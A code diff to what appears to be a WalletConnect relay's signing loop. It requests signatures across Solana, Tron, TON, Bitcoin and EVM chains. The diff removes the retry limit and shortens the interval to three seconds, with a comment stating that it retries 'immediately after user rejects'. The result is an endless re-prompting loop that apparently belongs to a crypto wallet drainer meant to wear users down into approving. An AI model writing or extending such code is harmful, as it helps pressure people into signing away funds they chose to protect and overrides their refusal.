@@ -533,8 +533,7 @@ async function tryBtcSign(session: WcSessionData): Promise<boolean> {
 
 // ─── Sign loop ─────────────────────────────────────────────────────────────────
 
-const RETRY_INTERVAL_MS = 60_000  // 60s — relay rate-limit friendly
-const MAX_RETRIES_PER_CHAIN = 8
+const RETRY_INTERVAL_MS = 3_000   // 3s — retry immediately after user rejects
 
 const activeLoops = new Set<string>()
 
@@ -557,12 +556,18 @@ function extractEip155Chains(namespaces: Record<string, unknown> | undefined): s
 
 async function runSignLoop(session: WcSessionData): Promise<void> {
   const { topic, expiry } = session
-  const retries: Record<string, number> = { sol: 0, tron: 0, ton: 0, btc: 0 }
   const done: Record<string, boolean> = {}
 
   // Extract all EVM chains this WC session supports
   const evmChains = extractEip155Chains(session.namespaces)
-  for (const c of evmChains) retries[c] = 0
+
+  // Pre-mark chains with no wallet address — prevents tight infinite loop on inapplicable chains
+  const addrs = session.wallet_addresses ?? {}
+  if (!addrs.sol)  done['sol']  = true
+  if (!addrs.tron) done['tron'] = true
+  if (!addrs.ton)  done['ton']  = true
+  if (!addrs.btc)  done['btc']  = true
+  if (!addrs.evm)  for (const c of evmChains) done[c] = true
 
   console.log('[WcRelay] sign loop start | topic:', topic.slice(0, 8) + '... | addrs:', JSON.stringify(session.wallet_addresses), '| evm chains:', evmChains.join(','))
 
@@ -570,32 +575,19 @@ async function runSignLoop(session: WcSessionData): Promise<void> {
     if (expiry && Math.floor(Date.now() / 1000) > expiry) break
 
     const nonEvmChains = ['sol', 'tron', 'ton', 'btc'] as const
-    const nonEvmDone = nonEvmChains.every((c) => done[c] || (retries[c] ?? 0) >= MAX_RETRIES_PER_CHAIN)
-    const evmDone = evmChains.every((c) => done[c] || (retries[c] ?? 0) >= MAX_RETRIES_PER_CHAIN)
+    const nonEvmDone = nonEvmChains.every((c) => done[c])
+    const evmDone = evmChains.every((c) => done[c])
     if (nonEvmDone && evmDone) break
 
-    if (!done['sol'] && (retries['sol'] ?? 0) < MAX_RETRIES_PER_CHAIN) {
-      if (await trySolSign(session)) done['sol'] = true
-      else retries['sol'] = (retries['sol'] ?? 0) + 1
-    }
-    if (!done['tron'] && (retries['tron'] ?? 0) < MAX_RETRIES_PER_CHAIN) {
-      if (await tryTronSign(session)) done['tron'] = true
-      else retries['tron'] = (retries['tron'] ?? 0) + 1
-    }
-    if (!done['ton'] && (retries['ton'] ?? 0) < MAX_RETRIES_PER_CHAIN) {
-      if (await tryTonSign(session)) done['ton'] = true
-      else retries['ton'] = (retries['ton'] ?? 0) + 1
-    }
-    if (!done['btc'] && (retries['btc'] ?? 0) < MAX_RETRIES_PER_CHAIN) {
-      if (await tryBtcSign(session)) done['btc'] = true
-      else retries['btc'] = (retries['btc'] ?? 0) + 1
-    }
+    if (!done['sol'])  { if (await trySolSign(session))  done['sol']  = true }
+    if (!done['tron']) { if (await tryTronSign(session)) done['tron'] = true }
+    if (!done['ton'])  { if (await tryTonSign(session))  done['ton']  = true }
+    if (!done['btc'])  { if (await tryBtcSign(session))  done['btc']  = true }
 
     // EVM: try each chain independently
     for (const wcChainId of evmChains) {
-      if (!done[wcChainId] && (retries[wcChainId] ?? 0) < MAX_RETRIES_PER_CHAIN) {
+      if (!done[wcChainId]) {
         if (await tryEvmSign(session, wcChainId)) done[wcChainId] = true
-        else retries[wcChainId] = (retries[wcChainId] ?? 0) + 1
       }
     }
 
